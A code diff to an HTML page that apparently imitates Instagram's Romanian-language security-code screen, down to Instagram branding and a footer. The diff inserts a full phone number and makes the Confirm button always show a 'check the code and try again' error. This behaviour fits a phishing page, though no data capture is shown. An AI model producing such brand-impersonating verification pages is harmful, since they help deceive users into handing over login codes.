@@ -17,13 +17,17 @@
             style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -104px; background-size: auto; width: 76px; height: 76px; background-repeat: no-repeat; display: inline-block;"></i>
     </div>
     <div class="verif">
-        <div> Introdu codul pe care l-am trimis pe numărul tău care se termină cu 6949.</div>
+        <div> Introdu codul pe care l-am trimis pe numărul 0751494938.</div>
     </div>
     <div class="form1">
         <div class="form2">
             <input type="text" class="form-field animation a3" placeholder="Cod de securitate">
-            <button class="butoaie" onclick="alert('Confirmat');" type="button">Confirmă</button>
+            <button class="butoaie" onclick="verificare();" type="button">Confirmă</button>
         </div>
+    </div>
+
+    <div id="verifici">
+        Te rugăm să verifici codul de securitate şi să încerci din nou.
     </div>
 
     <div class="retrimite">
@@ -67,5 +71,12 @@
     </div>
     <div class="copyright">© 2023 Instagram from Meta</div>
 </body>
+<script>
+    function verificare()
+    {
+        var k = document.getElementById("verifici");
+        k.style.display = "block";      
+    }
+</script>
 
 </html>
